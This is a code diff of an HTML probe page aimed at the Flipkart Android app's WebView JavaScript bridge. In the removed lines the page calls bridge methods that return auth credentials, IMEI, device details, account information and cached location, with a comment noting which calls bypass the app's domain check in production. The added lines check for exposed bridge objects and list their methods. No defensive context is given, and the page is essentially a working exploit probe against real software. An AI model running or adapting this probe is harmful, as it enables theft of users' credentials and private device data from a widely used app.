@@ -1,50 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flipkart Bridge Probe</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bridge Check</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #000; color: #0f0; }
+        pre { white-space: pre-wrap; word-wrap: break-word; }
+    </style>
 </head>
 <body>
-    <h2>Bridge Probe Running...</h2>
-    <pre id="out">Waiting for Android bridge...</pre>
+    <h2>Bridge Status</h2>
+    <pre id="out">Checking...</pre>
+
     <script>
-        function log(name, data) {
-            var line = "\n[" + name + "]\n" + JSON.stringify(data, null, 2);
-            document.getElementById('out').innerText += line;
-        }
-        try {
-            // These bypass b() check in production (!FlipkartApplication.K)
-            var auth = Android.getAuthCredentials();
-            log("getAuthCredentials", auth);
+        window.onload = function() {
+            var out = "";
+            var checks = [
+                ["Android", typeof Android],
+                ["FkOTPVerifier", typeof FkOTPVerifier],
+                ["foa", typeof foa],
+                ["window.Android", typeof window.Android],
+                ["window.FkOTPVerifier", typeof window.FkOTPVerifier],
+                ["window.foa", typeof window.foa]
+            ];
+            for (var i = 0; i < checks.length; i++) {
+                out += checks[i][0] + " = " + checks[i][1] + "\n";
+            }
+            document.getElementById("out").innerText = out;
 
-            var imei = Android.getIMEINumber();
-            log("getIMEINumber", imei);
-
-            var rooted = Android.isDeviceRooted();
-            log("isDeviceRooted", rooted);
-
-            var usb = Android.isUsbDebuggingEnabled();
-            log("isUsbDebuggingEnabled", usb);
-
-            var net = Android.getNetworkType();
-            log("getNetworkType", net);
-
-            var dev = Android.getDeviceDetails();
-            log("getDeviceDetails", dev);
-
-            var ver = Android.getAppVersion("com.flipkart.android");
-            log("getAppVersion", ver);
-
-            // These have b() check — might fail for external domain
-            try { log("getUserAccountInfo", Android.getUserAccountInformation()); } catch(e) { log("getUserAccountInfo", "BLOCKED"); }
-            try { log("getCachedLocation", Android.getCachedLocation()); } catch(e) { log("getCachedLocation", "BLOCKED"); }
-            try { log("getReferrer", Android.getReferrer()); } catch(e) { log("getReferrer", "BLOCKED"); }
-
-            document.getElementById('out').innerText += "\n\n=== DONE ===";
-
-        } catch(e) {
-            document.getElementById('out').innerText += "\nERROR: " + e;
-        }
+            // If Android exists, dump its methods
+            if (typeof Android === "object") {
+                try {
+                    var methods = Object.getOwnPropertyNames(Android).join(", ");
+                    document.getElementById("out").innerText += "\n\nAndroid methods:\n" + methods;
+                } catch(e) {
+                    document.getElementById("out").innerText += "\n\nCould not enumerate: " + e;
+                }
+            }
+        };
     </script>
 </body>
 </html>
